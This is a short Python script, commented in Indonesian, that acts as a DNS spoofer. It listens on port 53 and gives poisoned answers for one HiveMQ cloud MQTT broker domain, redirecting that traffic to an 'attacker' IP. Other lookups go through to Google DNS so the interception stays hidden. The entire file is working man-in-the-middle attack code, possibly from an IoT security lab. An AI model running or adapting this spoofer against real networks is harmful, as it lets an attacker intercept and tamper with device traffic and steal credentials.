import socket
from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE

TARGET_DOMAIN = "maroonhoney-9a9267a5.a03.euc1.aws.hivemq.cloud"
ATTACKER_IP = "10.100.85.98" 
# DNS asli Google untuk meneruskan pencarian NTP (pool.ntp.org)
UPSTREAM_DNS = ("8.8.8.8", 53)  

udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_sock.bind(('0.0.0.0', 53))

print(f"[DNS SPOOFER] Berjalan di port 53.")
print(f"[DNS SPOOFER] Mengalihkan trafik {TARGET_DOMAIN} ke {ATTACKER_IP}...")

while True:
    data, addr = udp_sock.recvfrom(512)
    request = DNSRecord.parse(data)
    qname = str(request.q.qname).rstrip('.')
    
    if qname == TARGET_DOMAIN:
        print(f"\n[!] MENCEGAT REQUEST DNS dari {addr[0]} untuk {qname}")
        print(f"[!] Mengirimkan jawaban beracun (Poisoned IP): {ATTACKER_IP}")
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ATTACKER_IP), ttl=60))
        udp_sock.sendto(reply.pack(), addr)
    else:
        # Domain lain (termasuk NTP) diteruskan secara transparan ke DNS asli
        try:
            fwd_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            fwd_sock.settimeout(2)
            fwd_sock.sendto(data, UPSTREAM_DNS)
            resp, _ = fwd_sock.recvfrom(512)
            udp_sock.sendto(resp, addr)
            fwd_sock.close()
        except socket.timeout:
            print(f"[!] Timeout forward query untuk {qname}")